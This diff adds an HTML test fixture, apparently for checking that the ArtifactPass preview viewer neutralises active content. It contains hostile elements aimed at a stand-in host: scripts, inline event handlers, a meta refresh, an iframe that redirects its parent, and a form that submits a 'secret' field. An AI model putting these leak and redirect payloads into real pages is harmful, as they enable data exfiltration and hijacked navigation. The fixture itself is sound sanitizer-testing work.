@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="refresh" content="0;url=https://leak.artifactpass.test/refresh">
+    <base href="https://leak.artifactpass.test/base/">
+    <link rel="stylesheet" href="https://leak.artifactpass.test/external.css">
+    <title>ArtifactPass hostile HTML security test</title>
+    <style>
+      @import url("https://leak.artifactpass.test/import.css");
+      :root { color-scheme: light dark; font-family: ui-sans-serif, system-ui, sans-serif; }
+      body { margin: 0; background: #101114 url("https://leak.artifactpass.test/background.png"); color: #f5f5f2; }
+      main { width: min(760px, calc(100% - 40px)); margin: 48px auto; }
+      header, section { padding: 24px; border: 1px solid #3a3d43; border-radius: 16px; background: #17191d; }
+      section { margin-top: 16px; }
+      h1 { margin: 0 0 10px; font-size: clamp(34px, 7vw, 64px); letter-spacing: -.05em; }
+      p, li { color: #b9bcc2; line-height: 1.6; }
+      a, button { display: inline-flex; margin: 6px 8px 6px 0; padding: 10px 14px; border: 1px solid #555a63; border-radius: 8px; color: #fff; background: #24272d; }
+      code { color: #fff; }
+    </style>
+  </head>
+  <body onload="fetch('https://leak.artifactpass.test/onload')">
+    <main>
+      <header>
+        <p>HOSTILE HTML TEST FIXTURE</p>
+        <h1 id="preview-heading">Visible preview</h1>
+        <p>If ArtifactPass is safe, this designed page renders but none of its active behavior works.</p>
+      </header>
+
+      <section>
+        <h2>Expected preview behavior</h2>
+        <ul>
+          <li>The page stays inside the ArtifactPass viewer.</li>
+          <li>The link below cannot navigate.</li>
+          <li>The form controls are disabled and cannot submit.</li>
+          <li>No image, stylesheet, frame, object, audio, or CSS resource loads from the network.</li>
+          <li>No script, inline event, meta refresh, or SVG animation runs.</li>
+        </ul>
+        <a id="clicked-link" href="https://leak.artifactpass.test/clicked" target="_top" ping="https://leak.artifactpass.test/ping" onclick="location.href='https://leak.artifactpass.test/onclick'">Unsafe link</a>
+        <form id="hostile-form" action="https://leak.artifactpass.test/submitted" method="post">
+          <label>Payload <input name="secret" value="should-not-leave"></label>
+          <button id="submit-button" type="submit" formaction="https://leak.artifactpass.test/button">Unsafe submit</button>
+        </form>
+      </section>
+
+      <section>
+        <h2>Resources that must disappear or become inert</h2>
+        <img src="https://leak.artifactpass.test/image.png" alt="External image must not load" onerror="fetch('https://leak.artifactpass.test/error')">
+        <iframe src="https://leak.artifactpass.test/frame" srcdoc="<script>parent.location='https://leak.artifactpass.test/srcdoc'</script>"></iframe>
+        <object data="https://leak.artifactpass.test/object"></object>
+        <audio controls src="https://leak.artifactpass.test/audio.mp3"></audio>
+        <svg viewBox="0 0 180 40" aria-label="SVG navigation test">
+          <a href="https://leak.artifactpass.test/svg"><text x="4" y="24">Unsafe SVG link</text></a>
+          <animate attributeName="opacity" values="1;0;1" dur="1s" repeatCount="indefinite"></animate>
+        </svg>
+      </section>
+    </main>
+
+    <script>
+      parent.postMessage("artifactpass-script-ran", "*");
+      fetch("https://leak.artifactpass.test/script");
+      window.location.assign("https://leak.artifactpass.test/navigation");
+    </script>
+  </body>
+</html>
